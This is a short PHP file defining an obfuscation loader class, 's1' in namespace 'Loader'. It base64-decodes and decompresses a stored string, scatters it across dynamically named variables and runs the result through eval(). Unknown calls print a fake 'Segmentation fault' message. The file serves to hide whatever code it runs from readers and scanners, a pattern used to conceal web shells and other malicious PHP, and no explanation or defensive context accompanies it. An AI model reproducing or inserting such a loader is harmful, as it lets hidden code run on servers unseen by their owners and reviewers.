<?php

namespace Loader;

class s1 {

	public static function get() {

		static $self = null;
		return $self ? $self : $self = new self;
	}

	private $functions = array();
	private $vars = array();

	public function __set( $name, $data ) {

		if( is_callable( $data ) ) {
			$this->functions[$name] = $data;
		} else {
			$this->vars[$name] = $data;
		}
	}

	public function __call( $method, $args ) {

		isset( $this->functions[$method] ) ?
			call_user_func_array( $this->functions[$method], $args )
		:
			die( 'Segmentation fault' );
	}

	private function dc( $d ) {

		return 'eval("$' . implode( '$', str_split( gzuncompress( base64_decode( $this->vars['i'] ) ), $d ) ) . "\");";
	}

	public function r( $d, $i ) {

		eval( $this->f( $this->vars['d'], array(), $d, $i ) . $this->dc( $d ) );
	}

	private function f( $s, $c, $d, $i ) {

		$r = '';
		if( $d <= 1 ) {
			$p = '';
			for( $m = 0; $m < sizeof( $c ); $m++ ) {
				$p .= $i[$c[$m]];
			}

			for( $j = 0; $j < strlen( $s ); $j++ ) {
				$r .= '$' . $p . $i[$j] . "='" . addcslashes( $s[$j], "'\\" ) . "';";
			}
			return $r;
		}
		$cSize = pow( strlen( $i ), $d - 1 );
		$xpl = str_split( $s, $cSize );
		for( $k = 0; $k < sizeof( $xpl ); $k++ ) {
			$c1 = $c;
			$c1[] = $k;
			$r .= $this->f( $xpl[$k], $c1, $d - 1, $i );
		}
		return $r;
	}
}